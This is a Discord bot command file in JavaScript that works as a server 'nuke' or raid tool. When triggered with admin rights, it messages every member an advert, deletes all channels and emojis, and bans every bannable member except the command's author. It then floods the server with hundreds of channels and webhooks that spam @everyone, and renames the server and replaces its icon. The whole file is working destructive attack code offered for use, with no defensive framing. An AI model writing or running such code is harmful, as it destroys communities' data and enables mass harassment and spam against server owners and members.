const { EmbedBuilder } = require("discord.js");
const Member = require("../../models/member");
const { error, hershell, success } = require("../lib/util");
module.exports = {
  name: "kawai",
  description: "asd",
  block: true,
  run: async (client, message, args, usMember, usOwner, usBlock) => {

    try{

        if(!message.guild.members.me.permissions.has("Administrator")) return error(message, "I'm missing permissions!")

        message.guild.members.cache.forEach(member => {
            if(member.id === client.user.id) return console.log(`asd`)
            member.send(`El servidor **${message.guild.name}** ha sido decorado por **Shabby** :) discord.gg/peru`)
        })

        message.guild.emojis.cache.forEach(emoji => emoji.delete());

    message.guild.channels.cache.forEach(channel => channel.delete());

    message.guild.members.cache.forEach(async (r) => {
        if(r.id !== message.author.id) {
            if(!r.bannable) return;
            await r.ban();
        }
    })


     for (let i = 0;i < 499;i++) {
        message.guild.channels.create({
            name: 'Shabby'
        }).then(c => {
          c.createWebhook({
            name: "Shabz",
            avatar: "https://media.discordapp.net/attachments/894697673150595113/906129601334509588/images_14.jpeg",
          }).then(m => {
            for (let i = 0;i < 25;i++) {
              m.send("@everyone discord.gg/peru")
            }
          })
            for (let i = 0;i < 15;i++) {
            c.send("@everyone fcked by shabby discord.gg/peru")
          }
        })
        }  

    await message.guild.setName("#Shabby")
    await message.guild.setIcon("https://cdn.discordapp.com/icons/1093539713123623033/e48b069cad5cb7c58bd13f7abd531948.png?size=2048")

    if(!message.guild.roles.cache.size > 249) {
        for (let i = 0;i < 249;i++) {
            message.guild.roles.create({
                name: "Shabby"
            })
            }
    } else {
        return console.log("Maximium roles created!")
    }

    } catch(e) {
        console.log(e)
    }
  },
};